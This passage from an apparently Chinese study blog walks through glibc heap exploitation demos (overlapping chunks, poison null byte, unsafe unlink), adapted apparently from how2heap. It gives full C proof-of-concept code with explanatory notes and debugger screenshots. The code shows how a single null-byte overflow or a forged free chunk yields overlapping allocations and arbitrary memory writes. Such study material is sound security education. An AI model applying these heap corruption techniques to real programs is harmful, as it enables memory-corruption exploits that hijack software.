  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p3 from %p to %p\n"</span><span class="token punctuation">,</span> p3<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> p3<span class="token operator">+</span>real_size_p3<span class="token punctuation">)</span><span class="token punctuation">;</span> 

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nData inside chunk p3: \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span> 

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nLet's write something inside p6\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p6<span class="token punctuation">,</span><span class="token char">'F'</span><span class="token punctuation">,</span><span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nData inside chunk p3: \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span></code></pre>

<p>申请5个chunk&#x3D;&#x3D;》初始化&#x3D;&#x3D;》释放p4&#x3D;&#x3D;》修改p2使p2正好完全覆盖p3同时保持其inuse位为1</p>
<p>&#x3D;&#x3D;》释放p2（包括p3）&#x3D;&#x3D;》再将其分配回p6&#x3D;&#x3D;》实现从p6控制p3</p>
<h3 id="poison-null-byte-c"><a href="#poison-null-byte-c" class="headerlink" title="poison_null_byte.c"></a>poison_null_byte.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to poison null byte 2.0!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Tested in Ubuntu 16.04 64bit.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">uint8_t</span><span class="token operator">*</span> a<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> c<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b1<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b2<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> d<span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>barrier<span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We allocate 0x100 bytes for 'a'.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a: %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> real_a_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Since we want to overflow 'a', we need to know the 'real' size of 'a' "</span>
		<span class="token string">"(it may be more than 0x100 because of rounding): %#x\n"</span><span class="token punctuation">,</span> real_a_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.
	 * the least significant byte of this will be 0x10, because the size of the chunk includes
	 * the amount requested plus some amount required for the metadata. */</span>
	b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b: %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>

	c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"c: %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>

	barrier <span class="token operator">=</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"</span>
		<span class="token string">"The barrier is not strictly necessary, but makes things less confusing\n"</span><span class="token punctuation">,</span> barrier<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">uint64_t</span><span class="token operator">*</span> b_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span>
	<span class="token comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span>
	<span class="token comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span>
	<span class="token comment">//*(size_t*)(b+0x1f0) = 0x200;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"In newer versions of glibc we will need to have our updated size inside b itself to pass "</span>
		<span class="token string">"the check 'chunksize(P) != prev_size (next_chunk(P))'\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span>
	<span class="token comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span>
	<span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token number">0x1f0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x200</span><span class="token punctuation">;</span>

	<span class="token comment">// this technique works by overwriting the size metadata of a free chunk</span>
	<span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b.size: %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>b_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b.size is: (0x200 + 0x10) | prev_in_use\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	a<span class="token punctuation">[</span>real_a_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// &lt;--- THIS IS THE "EXPLOITED BUG"</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b.size: %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>b_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">uint64_t</span><span class="token operator">*</span> c_prev_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"c.prev_size is %#lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span>c_prev_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// This malloc will result in a call to unlink on the chunk where b was.</span>
	<span class="token comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span>
	<span class="token comment">// will detect the heap corruption now.</span>
	<span class="token comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span>
	<span class="token comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span>
	<span class="token comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span>
	<span class="token comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n"</span><span class="token punctuation">,</span>
		<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	b1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b1: %p\n"</span><span class="token punctuation">,</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we malloc 'b1'. It will be placed where 'b' was. "</span>
		<span class="token string">"At this point c.prev_size should have been updated, but it was not: %#lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span>c_prev_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Interestingly, the updated value of c.prev_size has been written 0x10 bytes "</span>
		<span class="token string">"before c.prev_size: %lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We malloc 'b2', our 'victim' chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span>

	b2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b2: %p\n"</span><span class="token punctuation">,</span>b2<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">memset</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span><span class="token char">'B'</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Current b2 content:\n%s\n"</span><span class="token punctuation">,</span>b2<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">free</span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finally, we allocate 'd', overlapping 'b2'.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"d: %p\n"</span><span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now 'd' and 'b2' overlap.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span><span class="token char">'D'</span><span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"New b2 content:\n%s\n"</span><span class="token punctuation">,</span>b2<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"</span>
		<span class="token string">"for the clear explanation of this technique.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span> <span class="token string">"DDDDDDDDDDDD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请4个chunk：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621213452845.png"></p>
<p>修改chunk b：</p>
<p>修改前：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621213604647.png"></p>
<p>修改后：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621213652220.png"></p>
<p>释放chunk b，并修改b的size位</p>
<p>释放：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621214139390.png"></p>
<p>修改后：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621214155726.png"></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621214216685.png"></p>
<p>分配一个chunk b1，一个chunk b2：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621215153120.png"></p>
<p>释放了b1和c&#x3D;&#x3D;&gt;</p>
<p>在释放c时，由于_int_free检查到c的prev_size对应的偏移b1是一个unsorted free chunk&#x3D;&#x3D;》执行malloc_consolidata进行合并&#x3D;&#x3D;》完全覆盖了b2，此时b2还有读写操作</p>
<p>再将c重新分配回去实现向c写入数据可以更改b2的内容</p>
<p><strong>重点：</strong>通过溢出一个空字节修改chunk 的size，使其变小，再伪造fake_prev_size，下一个chunk的真正的prev_size不会被修改&#x3D;&#x3D;》实现不修改后面的chunk的prev_size就能与前面的chunk合并</p>
<p>演变过程：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621222255578.png"></p>
<h3 id="unsafe-unlink-c"><a href="#unsafe-unlink-c" class="headerlink" title="unsafe_unlink.c"></a>unsafe_unlink.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token class-name">uint64_t</span> <span class="token operator">*</span>chunk0_ptr<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to unsafe unlink 2.0!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Tested in Ubuntu 14.04/16.04 64bit.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">int</span> malloc_size <span class="token operator">=</span> <span class="token number">0x80</span><span class="token punctuation">;</span> <span class="token comment">//we want to be big enough not to use fastbins</span>
	<span class="token keyword">int</span> header_size <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	chunk0_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>malloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//chunk0</span>
	<span class="token class-name">uint64_t</span> <span class="token operator">*</span>chunk1_ptr  <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>malloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//chunk1</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The global chunk0_ptr is at %p, pointing to %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token punctuation">,</span> chunk0_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The victim chunk we are going to corrupt is at %p\n\n"</span><span class="token punctuation">,</span> chunk1_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We create a fake chunk inside chunk0.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P->fd->bk = P.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	chunk0_ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P->bk->fd = P.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fake chunk fd: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> chunk0_ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fake chunk bk: %p\n\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">uint64_t</span> <span class="token operator">*</span>chunk1_hdr <span class="token operator">=</span> chunk1_ptr <span class="token operator">-</span> header_size<span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	chunk1_hdr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> malloc_size<span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>chunk1_hdr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	chunk1_hdr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;=</span> <span class="token operator">~</span><span class="token number">1</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>chunk1_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> victim_string<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">strcpy</span><span class="token punctuation">(</span>victim_string<span class="token punctuation">,</span><span class="token string">"Hello!~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> victim_string<span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Original value: %s\n"</span><span class="token punctuation">,</span>victim_string<span class="token punctuation">)</span><span class="token punctuation">;</span>
	chunk0_ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x4141414142424242LL</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"New Value: %s\n"</span><span class="token punctuation">,</span>victim_string<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// sanity check</span>
	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim_string <span class="token operator">==</span> <span class="token number">0x4141414142424242L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p> 申请chunk0和chunk1：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220622101125626.png"></p>
<p>在chunk0中存放：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220622101440771.png"></p>
<p>修改chunk1的prev_size和size位：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220622102438061.png"></p>
<p>释放chunk1：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220622151607525.png"></p>
<p>红色一整块合并为top chunk&#x3D;&#x3D;》</p>
<p><strong>重点：</strong></p>
<p>unlink过程：</p>
<p>首先是未释放chunk1前：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220622160442815.png"></p>
<p>释放chunk1，合并，unlink后：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220622160830693.png"></p>
